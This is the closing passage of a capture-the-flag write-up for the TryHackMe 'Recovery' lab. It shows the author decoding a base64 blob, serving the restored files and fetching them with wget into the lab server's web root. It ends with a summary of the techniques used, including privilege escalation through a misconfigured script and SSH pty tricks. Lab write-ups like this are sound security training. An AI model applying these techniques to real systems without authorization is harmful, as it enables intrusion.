TEZLTUxMYURTSQ1aRVdmTEZLTUxQbhcHEBw1W31mTEZLUUMEJAUXV3paRVdmTFoJAggVf25TSVBw
RVdmTFoDXFI+JAccHxUiHAQpChJXQgRdf255SVBwRVdmTEZXHVJmYURTSVBwRVdmTEZLPwkPLhIW
GwkjChEyTA4OARwfYQ8WDABwHBgzHkYNBAAJMkQACBY1RRYoCEYYCA8ZMwFdY1BwRVdmTEZLUUMc
f255SVBwRVdmTEZXDxkYNQsdVzc1EVcVGAcZGQkIfUsRHAQkChl4ZmxLTUxMYURTSUw2ChgyCRRV
Z0xMYURTSVBwRVdmTDEODxwNJgFTHgI5EQMjAkYJFEwtLQELSSMlCBojHhIEA0JmYURTSVBwRVd6
QwAEAhgJM1p5SVBwRUtpDgkPFFJmfUsbHR08Ww==" | base64 -d > index.html
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a5.png)

Let's return them into original state!

```
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/flag5]
└─# nano index.html
                                                                                                                    
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/flag5]
└─# nano reallyimportant.txt
                                                                                                                    
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/flag5]
└─# nano todo.html          
                                                                                                                    
┌──(root🌸siunam)-[~/…/thm/ctf/Recovery/flag5]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
root@recoveryserver:~# wget http://10.18.61.134/index.html -O /usr/local/apache2/htdocs/index.html

root@recoveryserver:~# wget http://10.18.61.134/reallyimportant.txt -O /usr/local/apache2/htdocs/reallyimportant.txt

root@recoveryserver:~# wget http://10.18.61.134/todo.html -O /usr/local/apache2/htdocs/todo.html
```

**Flag5:**
```
THM{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Recovery/images/a6.png)

We did it!!

# Conclusion

What we've learned:

1. Reverse Engineering via `strings` & Cutter
2. Disabling `pty` in SSH
3. Privilege Escalation via Misconfigured File Permission in `/opt/brilliant_script.sh`
4. Encrypting File via XOR